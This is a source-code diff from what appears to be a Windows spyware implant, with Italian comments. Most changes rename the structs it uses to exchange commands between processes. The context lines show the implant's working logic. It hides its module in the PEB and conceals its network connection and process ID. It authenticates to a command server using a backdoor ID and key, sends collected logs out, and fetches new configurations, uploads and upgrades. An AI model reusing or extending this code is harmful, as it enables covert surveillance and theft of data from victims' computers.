@@ -62,6 +62,7 @@ ASPThreadDataStruct ASPThreadData;
 #define ASP_FETCH 1 // ASP host deve eseguire l'action
 #define ASP_DONE  2 // ASP host ha finito con successo
 #define ASP_ERROR 3 // ASP host ha finito con un errore
+
 typedef struct {
 	DWORD action;    // Azione da eseguire 
 	DWORD status;    // stato dell'operazione (va settato per ultimo)
@@ -70,7 +71,7 @@ typedef struct {
 	DWORD in_param_len;
 	BYTE out_param[MAX_ASP_OUT_PARAM];  // output del comando sul server
 	DWORD out_param_len;
-} ASP_IPCCommandDataStruct;
+} ASP_IPC_CTRL;
 
 /*#define REQUEST_ARRAY_LEN 19
 WCHAR *wRequest_array[] = {
@@ -102,7 +103,7 @@ WCHAR *wRequest_array[] = {
 	};
 
 HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
-ASP_IPCCommandDataStruct *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
+ASP_IPC_CTRL *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
 HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
 CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT; // struttura per memorizzare il pid da nascondere
 PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
@@ -193,7 +194,7 @@ BOOL ASP_IPCAttach()
 	// Riutilizza ASP_IPC_command tanto non l'host ASP non lo condivide 
 	// con il core
 	if (h_file) 
-		ASP_IPC_command = (ASP_IPCCommandDataStruct *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPCCommandDataStruct));
+		ASP_IPC_command = (ASP_IPC_CTRL *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));
 
 	if (ASP_IPC_command)
 		return TRUE;
@@ -205,12 +206,12 @@ BOOL ASP_IPCAttach()
 // Inizializza nel core la shared memory per ASP
 BOOL ASP_IPCSetup()
 {
-	hASPIPCcommandfile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPCCommandDataStruct), shared.SHARE_MEMORY_ASP_COMMAND_NAME);
+	hASPIPCcommandfile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPC_CTRL), shared.SHARE_MEMORY_ASP_COMMAND_NAME);
 	if (hASPIPCcommandfile)
-		ASP_IPC_command = (ASP_IPCCommandDataStruct *)FNC(MapViewOfFile)(hASPIPCcommandfile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPCCommandDataStruct));
+		ASP_IPC_command = (ASP_IPC_CTRL *)FNC(MapViewOfFile)(hASPIPCcommandfile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));
 
 	if (ASP_IPC_command) {
-		memset(ASP_IPC_command, 0, sizeof(ASP_IPCCommandDataStruct));
+		memset(ASP_IPC_command, 0, sizeof(ASP_IPC_CTRL));
 		return TRUE;
 	}
 
@@ -1128,7 +1129,7 @@ void WINAPI ASP_MainLoop(char *asp_server)
 	BYTE *message = NULL;
 
 	// Possibili strutture da tornare al core...
-	asp_reply_setup *reply_setup;
+	ASP_REPLY_SETUP *reply_setup;
 
 	// Modifica il nome del modulo nella peb
 	HidePEB(GetModuleHandle(shared.H4DLLNAME));
@@ -1142,7 +1143,7 @@ void WINAPI ASP_MainLoop(char *asp_server)
 	// Esegue il setup delle winhttp e risolve l'indirizzo del server (o di un eventuale proxy)
 	if (H_ASP_WinHTTPSetup(asp_server, server_ip, sizeof(server_ip), &server_port)) {
 		// e ritorna con successo l'ip da nascondere al processo padre
-		reply_setup = (asp_reply_setup *)ASP_IPC_command->out_param;
+		reply_setup = (ASP_REPLY_SETUP *)ASP_IPC_command->out_param;
 		reply_setup->server_addr = inet_addr(server_ip);
 		reply_setup->server_port = server_port;
 		ASP_IPC_command->status = ASP_DONE;
@@ -1157,7 +1158,7 @@ void WINAPI ASP_MainLoop(char *asp_server)
 
 		// Esegue la spedizione/ricezione dei dati a seconda dell'action
 		if (ASP_IPC_command->action == ASP_AUTH) {
-			asp_request_auth *ra  = (asp_request_auth *)ASP_IPC_command->in_param;
+			ASP_REQUEST_AUTH *ra  = (ASP_REQUEST_AUTH *)ASP_IPC_command->in_param;
 			ret_success = H_ASP_Auth(CLIENT_KEY, 16, ra->backdoor_id, strlen(ra->backdoor_id), (char *)ra->instance_id, 20, ra->subtype, strlen(ra->subtype), (char *)ra->conf_key, 16, &ASP_IPC_command->out_command);
 
 		} else if (ASP_IPC_command->action == ASP_BYE) {
@@ -1165,13 +1166,13 @@ void WINAPI ASP_MainLoop(char *asp_server)
 			SAFE_FREE(message);
 
 		} else if (ASP_IPC_command->action == ASP_IDBCK) {
-			asp_request_id *ri  = (asp_request_id *)ASP_IPC_command->in_param;
+			ASP_REQUEST_ID *ri  = (ASP_REQUEST_ID *)ASP_IPC_command->in_param;
 			message = H_ASP_ID(ri->username, ri->device, L"", &msg_len);
 			ret_success = (BOOL)message;
 			ASP_REPORT_MESSAGE_BACK;
 
 		} else if (ASP_IPC_command->action == ASP_UPLO || ASP_IPC_command->action == ASP_UPGR) {
-			asp_reply_upload *ru  = (asp_reply_upload *)ASP_IPC_command->out_param;
+			ASP_REPLY_UPLOAD *ru  = (ASP_REPLY_UPLOAD *)ASP_IPC_command->out_param;
 			WCHAR *file_name = NULL;
 			BOOL is_upload = FALSE;
 			// Verifica se si tratta di un upload o di un upgrade
@@ -1183,11 +1184,11 @@ void WINAPI ASP_MainLoop(char *asp_server)
 			SAFE_FREE(file_name);
 
 		} else if (ASP_IPC_command->action == ASP_SLOG) {
-			asp_request_log *rl  = (asp_request_log *)ASP_IPC_command->in_param;
+			ASP_REQUEST_LOG *rl  = (ASP_REQUEST_LOG *)ASP_IPC_command->in_param;
 			ret_success = H_ASP_SendFile(rl->file_name, rl->byte_per_second, &ASP_IPC_command->out_command); 
 			
 		} else if (ASP_IPC_command->action == ASP_NCONF) {
-			asp_request_conf *rc = (asp_request_conf *)ASP_IPC_command->in_param;
+			ASP_REQUEST_CONF *rc = (ASP_REQUEST_CONF *)ASP_IPC_command->in_param;
 			ret_success = H_ASP_GenericCommand(PROTO_NEW_CONF, &ASP_IPC_command->out_command, &message, &msg_len);
 			if (ret_success && ASP_IPC_command->out_command == PROTO_OK) {
 				DWORD proto_ok = PROTO_OK;
@@ -1210,7 +1211,7 @@ void WINAPI ASP_MainLoop(char *asp_server)
 			ASP_REPORT_MESSAGE_BACK;
 
 		} else if (ASP_IPC_command->action == ASP_SSTAT) {
-			ret_success = H_ASP_GenericCommandPL(PROTO_LOGSTATUS, ASP_IPC_command->in_param, sizeof(asp_request_stat), &ASP_IPC_command->out_command, &message, &msg_len);
+			ret_success = H_ASP_GenericCommandPL(PROTO_LOGSTATUS, ASP_IPC_command->in_param, sizeof(ASP_REQUEST_STAT), &ASP_IPC_command->out_command, &message, &msg_len);
 			SAFE_FREE(message);
 
 		}  else if (ASP_IPC_command->action == ASP_PURGE) {
@@ -1374,7 +1375,7 @@ BOOL ASP_Start(char *process_name, char *asp_server)
 		// Se ha concluso con successo legge l'ip (da out_param), 
 		// lo memorizza nella struttura connection_hide e lo nasconde
 		if (ret_val == ASP_POLL_DONE) {
-			asp_reply_setup *rs = (asp_reply_setup *)ASP_IPC_command->out_param;
+			ASP_REPLY_SETUP *rs = (ASP_REPLY_SETUP *)ASP_IPC_command->out_param;
 			SET_CONNETCION_HIDE_STRUCT(connection_hide, rs->server_addr, htons(rs->server_port));
 			AM_AddHide(HIDE_CNN, &connection_hide);
 			return TRUE;
@@ -1436,7 +1437,7 @@ void ASP_Bye()
 // response_command deve essere allocato dal chiamante
 BOOL ASP_Auth(char *backdoor_id, BYTE *instance_id, char *subtype, BYTE *conf_key, DWORD *response_command)
 {
-	asp_request_auth *ra;
+	ASP_REQUEST_AUTH *ra;
 
 	// Controlla che il processo host ASP sia ancora aperto e che non stia
 	// gia' eseguendo delle operazioni
@@ -1445,7 +1446,7 @@ BOOL ASP_Auth(char *backdoor_id, BYTE *instance_id, char *subtype, BYTE *conf_ke
 
 	// Passa i comandi all'host per eseguire l'auth
 	ASP_IPC_command->action = ASP_AUTH;
-	ra  = (asp_request_auth *)ASP_IPC_command->in_param;
+	ra  = (ASP_REQUEST_AUTH *)ASP_IPC_command->in_param;
 	_snprintf_s(ra->backdoor_id, sizeof(ra->backdoor_id), _TRUNCATE, "%s", backdoor_id);
 	_snprintf_s(ra->subtype, sizeof(ra->subtype), _TRUNCATE, "%s", subtype);
 	memcpy(ra->instance_id, instance_id, sizeof(ra->instance_id));
@@ -1464,7 +1465,7 @@ BOOL ASP_Auth(char *backdoor_id, BYTE *instance_id, char *subtype, BYTE *conf_ke
 // time_date e availables devono essere allocati dal chiamante
 BOOL ASP_Id(WCHAR *username, WCHAR *device, long long *time_date, DWORD *availables, DWORD size_avail)
 {
-	asp_request_id *ri;
+	ASP_REQUEST_ID *ri;
 
 	// Controlla che il processo host ASP sia ancora aperto e che non stia
 	// gia' eseguendo delle operazioni
@@ -1473,7 +1474,7 @@ BOOL ASP_Id(WCHAR *username, WCHAR *device, long long *time_date, DWORD *availab
 
 	// Passa i comandi all'host per eseguire l'id
 	ASP_IPC_command->action = ASP_IDBCK;
-	ri  = (asp_request_id *)ASP_IPC_command->in_param;
+	ri  = (ASP_REQUEST_ID *)ASP_IPC_command->in_param;
 	_snwprintf_s(ri->username, sizeof(ri->username)/sizeof(WCHAR), _TRUNCATE, L"%s", username);
 	_snwprintf_s(ri->device, sizeof(ri->device)/sizeof(WCHAR), _TRUNCATE, L"%s", device);
 	ASP_IPC_command->status = ASP_FETCH;
@@ -1495,7 +1496,7 @@ BOOL ASP_Id(WCHAR *username, WCHAR *device, long long *time_date, DWORD *availab
 // file_name_len e' in byte
 BOOL ASP_GetUpload(BOOL is_upload, WCHAR *file_name, DWORD file_name_len, DWORD *upload_left)
 {
-	asp_reply_upload *ru;
+	ASP_REPLY_UPLOAD *ru;
 
 	// Controlla che il processo host ASP sia ancora aperto e che non stia
 	// gia' eseguendo delle operazioni
@@ -1518,7 +1519,7 @@ BOOL ASP_GetUpload(BOOL is_upload, WCHAR *file_name, DWORD file_name_len, DWORD 
 	if (ASP_IPC_command->out_command == PROTO_NO)
 		return TRUE;
 
-	ru  = (asp_reply_upload *)ASP_IPC_command->out_param;
+	ru  = (ASP_REPLY_UPLOAD *)ASP_IPC_command->out_param;
 	*upload_left = ru->upload_left;
 	_snwprintf_s(file_name, file_name_len/sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
 
@@ -1529,7 +1530,7 @@ BOOL ASP_GetUpload(BOOL is_upload, WCHAR *file_name, DWORD file_name_len, DWORD 
 // Prende in input il path del log da mandare e il bandlimit
 BOOL ASP_SendLog(char *file_name, DWORD byte_per_second)
 {
-	asp_request_log *rl;
+	ASP_REQUEST_LOG *rl;
 
 	// Controlla che il processo host ASP sia ancora aperto e che non stia
 	// gia' eseguendo delle operazioni
@@ -1537,7 +1538,7 @@ BOOL ASP_SendLog(char *file_name, DWORD byte_per_second)
 		return FALSE;
 
 	ASP_IPC_command->action = ASP_SLOG;
-	rl  = (asp_request_log *)ASP_IPC_command->in_param;
+	rl  = (ASP_REQUEST_LOG *)ASP_IPC_command->in_param;
 	_snwprintf_s(rl->file_name, sizeof(rl->file_name)/sizeof(WCHAR), _TRUNCATE, L"%S", file_name);
 	rl->byte_per_second = byte_per_second;
 	ASP_IPC_command->status = ASP_FETCH;
@@ -1556,7 +1557,7 @@ BOOL ASP_SendLog(char *file_name, DWORD byte_per_second)
 // Prende in input numero e size dei log (qword)
 BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
 {
-	asp_request_stat *rs;
+	ASP_REQUEST_STAT *rs;
 
 	// Controlla che il processo host ASP sia ancora aperto e che non stia
 	// gia' eseguendo delle operazioni
@@ -1564,7 +1565,7 @@ BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
 		return FALSE;
 
 	ASP_IPC_command->action = ASP_SSTAT;
-	rs  = (asp_request_stat *)ASP_IPC_command->in_param;
+	rs  = (ASP_REQUEST_STAT *)ASP_IPC_command->in_param;
 	rs->log_count = log_count;
 	rs->log_size = log_size;
 	ASP_IPC_command->status = ASP_FETCH;
@@ -1582,7 +1583,7 @@ BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
 // Il file viene salvato nel path specificato (CONF_BU)
 BOOL ASP_ReceiveConf(char *conf_file_path)
 {
-	asp_request_conf *rc;
+	ASP_REQUEST_CONF *rc;
 
 	// Controlla che il processo host ASP sia ancora aperto e che non stia
 	// gia' eseguendo delle operazioni
@@ -1590,7 +1591,7 @@ BOOL ASP_ReceiveConf(char *conf_file_path)
 		return FALSE;
 
 	ASP_IPC_command->action = ASP_NCONF;
-	rc  = (asp_request_conf *)ASP_IPC_command->in_param;
+	rc  = (ASP_REQUEST_CONF *)ASP_IPC_command->in_param;
 	_snwprintf_s(rc->conf_path, sizeof(rc->conf_path)/sizeof(WCHAR), _TRUNCATE, L"%S", conf_file_path);
 	ASP_IPC_command->status = ASP_FETCH;
 
@@ -1607,7 +1608,7 @@ BOOL ASP_ReceiveConf(char *conf_file_path)
 // Ottiene i dati necessari per una richiesta di purge dei log
 BOOL ASP_HandlePurge(long long *purge_time, DWORD *purge_size)
 {
-	asp_reply_purge *arp;
+	ASP_REPLY_PURGE *arp;
 
 	*purge_time = 0;
 	*purge_size = 0;
@@ -1624,11 +1625,11 @@ BOOL ASP_HandlePurge(long long *purge_time, DWORD *purge_size)
 		return FALSE;
 
 	// Controlla il response e la lunghezza minima di una risposta
-	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(asp_reply_purge))
+	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(ASP_REPLY_PURGE))
 		return FALSE;
 
 	// Numero di download richiesti
-	arp = (asp_reply_purge *)ASP_IPC_command->out_param;
+	arp = (ASP_REPLY_PURGE *)ASP_IPC_command->out_param;
 	*purge_time = arp->purge_time;
 	*purge_size = arp->purge_size;
 
